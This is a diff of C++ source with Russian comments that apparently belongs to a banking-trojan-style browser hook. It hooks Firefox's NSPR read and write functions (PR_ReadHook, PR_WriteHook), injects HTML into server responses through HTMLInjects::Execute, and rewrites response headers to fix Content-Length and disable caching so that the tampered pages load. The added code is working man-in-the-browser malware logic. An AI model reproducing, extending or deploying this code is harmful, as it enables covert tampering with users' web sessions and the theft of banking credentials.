@@ -300,55 +300,44 @@ namespace FFUtils
 	}
 	//----------------------------------------------------------------------------
 
-
-	void UpdateContentLength(PRequest Request)
+	void UpdateResponseHeaders(PRequest Request)
 	{
-		// Обновить длину контента
-		PCHAR Buf = (PCHAR)Request->Buffer;
+		// Функция обновляет заголовки ответа сервера
+		PCHAR Document = (PCHAR)Request->Buffer;
+		DWORD MaxHeadSize = Request->HeaderSize + 512;
+		PCHAR Head = STR::Alloc(MaxHeadSize) ;
+		STR::Copy(Document, Head, 0, Request->HeaderSize);
+		Document += Request->HeaderSize;
 
-		// Определяем позицию вставки
-		int Pos = STR::Pos(Buf, ParamContentLength, 0, false);
-		if (Pos < 0) return;
-		Pos += StrCalcLength(ParamContentLength);
+		Request->ContentLength = Request->BufferSize - Request->HeaderSize ;
+        PCHAR LenValue = StrLongToString(Request->ContentLength);
 
-		// Определяем новый размер
-		Request->ContentLength = StrCalcLength(Buf + Request->HeaderSize);
+        DWORD HeadSize = 0;
 
-		PCHAR BufEnd = Buf + (Request->HeaderSize + Request->ContentLength);
+		// Меняем размер контента
+		HTTPParser::SetHeaderValue(Head, 0, MaxHeadSize, ParamContentLength, LenValue, &HeadSize);
 
-		// Создаём строку
-		PCHAR CLS = StrLongToString(Request->ContentLength);
-		PCHAR InLine = STR::New(2, ": ", CLS);
-		DWORD InLineLen = StrCalcLength(InLine);
-		STR::Free(CLS);
+		// Отключаем кеширование документа
+		HTTPParser::SetHeaderValue(Head, 0, MaxHeadSize, ParamCacheControl, ValueNoCacheDocument, &HeadSize);
 
-		// Определяем указатели на копируемые блоки
-		PCHAR AfterPtr = Buf + Pos;
-		while (*AfterPtr != 10 && *AfterPtr != 13) AfterPtr++;
+		STR::Free(LenValue);
 
-		// Определяем общий размер буфера
-		DWORD Len = Pos + InLineLen + (BufEnd - AfterPtr);
 
-		PCHAR NewBuf = (PCHAR)MemAlloc(Len + 1);
-		if (NewBuf == NULL) return;
+		// Собираем новый ответ
+		DWORD NewSize = HeadSize + Request->ContentLength;
+		PCHAR NewBuf = (PCHAR)MemAlloc(NewSize + 1);
 
-		// Копируем данные
-		PCHAR Tmp = NewBuf;
+		m_memcpy(NewBuf, Head, HeadSize);
+		m_memcpy(NewBuf + HeadSize, Document, Request->ContentLength);
 
-		m_memcpy(Tmp, Buf, Pos);
-		Tmp += Pos;
-
-		m_memcpy(Tmp, InLine, InLineLen);
-		Tmp += InLineLen;
-		STR::Free(InLine);
-
-		m_memcpy(Tmp, AfterPtr, BufEnd - AfterPtr);
-
-		*(NewBuf + Len) = 0;
+		*(NewBuf + NewSize) = 0;
 
 		// Устанавливаем новый буяер
-		Request::SetBuffer(Request, (LPBYTE)NewBuf, Len);
+		Request::SetBuffer(Request, (LPBYTE)NewBuf, NewSize);
+
+		STR::Free(Head);
 	}
+
 	//----------------------------------------------------------------------------
 
 }
@@ -375,7 +364,7 @@ namespace FFUtils
 		Request->Injected = true;
 		if (HTMLInjects::Execute(Request, &Session))
 		{
-			FFUtils::UpdateContentLength(Request);
+			FFUtils::UpdateResponseHeaders(Request);
 			FFDBG(Request, NULL, "+++++  В документ внесены изменения");
 			return true;
 		}
@@ -769,21 +758,20 @@ PRInt32 PR_ReadHook(PRFileDesc *fd, void* buf, PRInt32 amount )
 PRInt32 PR_WriteHook(PRFileDesc *fd, const void* buf, PRInt32 amount )
 {
 	//  Метод отправки данных на сервер
-	
+	// Для теста 
 
-		// Для теста 
-	
+	PCHAR PBuf = (PCHAR)buf;
+	if (STR::Pos(PBuf, "script6") >= 0)
+
+	{
+		DWORD FT = fd->methods->file_type;
+		buf = buf;
+	} 
 
 	PRequest Request = Request::Find(FFRequests, fd);
 	if ( Request != NULL )
 	{
 
-		PCHAR PBuf = (PCHAR)buf;
-		if (STR::Pos(PBuf, "script6") >= 0)
-		{
-			DWORD FT = fd->methods->file_type;
-			buf = buf;
-		} 
 
 		FFDBG(Request, (PCHAR)buf, "Отправка запроса на %s", Request->URL);
 
